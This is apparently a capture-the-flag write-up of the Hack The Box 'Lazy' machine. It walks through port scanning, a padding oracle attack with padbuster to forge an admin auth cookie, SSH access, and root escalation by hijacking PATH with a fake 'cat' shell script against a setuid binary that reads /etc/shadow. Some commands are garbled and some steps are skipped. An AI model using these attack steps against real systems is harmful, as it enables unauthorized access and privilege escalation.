![logo](/logo.png)

# [LAZY- BOX]  
Hi folks, today I am going to solve an medium rated hack the box machine which was released on 03 May 2017 as the 14th machine on HTB,Lazy created by [trickster0](https://app.hackthebox.com/users/169).So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Joomla
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/lazy 10.10.10.18
```

###### Output 

![](/Linux/Linux-Medium/Lazy/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/lazy 10.10.10.18                                     ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 06:52 EAT
Nmap scan report for 10.10.10.18
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CompanyDev
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.49 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.7`. 

port[22]-ssh
port[80]-http

when we naviagate to [http://10.10.10.18](http://10.10.10.18)  we find a page for a `decvompany`

![](/Linux/Linux-Medium/Lazy/Screenshots/defaultpage.png)

we find nothing of intreast on the page so lets try enumerate directories with `gobuster`

![](/Linux/Linux-Medium/Lazy/Screenshots/gobuster.png)

There are a few PHP files, and they all seem to be a part of the same application. The best place
to start appears to be the login and register pages, as the other files provide no useful
functionality or information when viewed.

I had registred an account so lets open burp and capture the request when loging in 

![](/Linux/Linux-Medium/Lazy/Screenshots/logiin.png)

we see that it sets a cookie in `auth:...` 

![](/Linux/Linux-Medium/Lazy/Screenshots/burpsuite.png)

so lets send this request to `sequencer` so that we can analyze if the cookie keeps changing or repeating the same cookies.The only cookie created by the server is the auth cookie, which appears as `auth=7%2FDQjMk33vAm4Mc4ifWeO3m5Bl3Lf5al`

![](/Linux/Linux-Medium/Lazy/Screenshots/sequencer.png)

After doing the sequencer we now go back to check if we have an Sql injection by using the admin to see it is a user in the system.

![](/Linux/Linux-Medium/Lazy/Screenshots/admin.png)

so we know admin exists so lets try register `admin` again with some sql injection so that we can see if admin is logged in because of bad serialization.But first we can be able to do a `padbuster` 

```sh
padbuster http://10.10.10.18 7%2FDQjMk33vAm4Mc4ifWeO3m5Bl3Lf5al 8 -cookies auth=7%2FDQjMk33vAm4Mc4ifWeO3m5Bl3Lf5al -encoding 0 
```

![](/Linux/Linux-Medium/Lazy/Screenshots/padding.png)

Running a padding oracle attack against the target with padbuster reveals the target is indeed
vulnerable. The output reveals the username, which is stored client-side. This can be easily
exploited.

![](/Linux/Linux-Medium/Lazy/Screenshots/padd.png)

![](/Linux/Linux-Medium/Lazy/Screenshots/padbuster.png)


Knowing that a padding oracle attack can be used against this target, it is possible to encrypt
user supplied data with the same method. In this case, encrypting `user=admin` will produce a
valid` auth cookie`. 

```sh
padbuster http://10.10.10.18 7%2FDQjMk33vAm4Mc4ifWeO3m5Bl3Lf5al 8 -cookies auth=7%2FDQjMk33vAm4Mc4ifWeO3m5Bl3Lf5al -encoding 0 -plaintext user=admin
```

trying to register admin with `admin==` we are logged in as an admin

![](/Linux/Linux-Medium/Lazy/Screenshots/joomla.png)

we find out that that is the ssh key for `mitsos`  so let use it to login

![](Linux/Linux-Medium/Lazy/Screenshots/shell.png)

we can now find the user flag 

![](/Linux/Linux-Medium/Lazy/Screenshots/flag.png)

# Privillage Escalation

After gaining entry to the target via SSH (and grabbing the user flag at `/home/mitsos/user.txt`,
the next step is to observe the backup binary available in the user’s home directory. 

![](/Linux/Linux-Medium/Lazy/Screenshots/backup.png)

A quickglimpse shows that it has sticky bits set, which will run it as the root user. Running strings against the binary shows that it executes the command `cat /etc/shadow`

![](/Linux/Linux-Medium/Lazy/Screenshots/strings.png)

Because a full path to the cat binary is not specified, this specific command is vulnerable to
hijacking by modifying the PATH system variable. This can be achieved by setting the working
directory as the first option in `PATH`, with the command export `PATH=.:$PATH`

```sh
echo PATH= `pwd`:PATH
```

cat file is just a simple shell

```sh
#!/bin/sh

/bin/sh
```

![](Linux/Linux-Medium/Lazy/Screenshots/pwd.png)

and because we modified cat so we are to use less to get the root flag.

	-------------------------END successful attack @lesley----------------------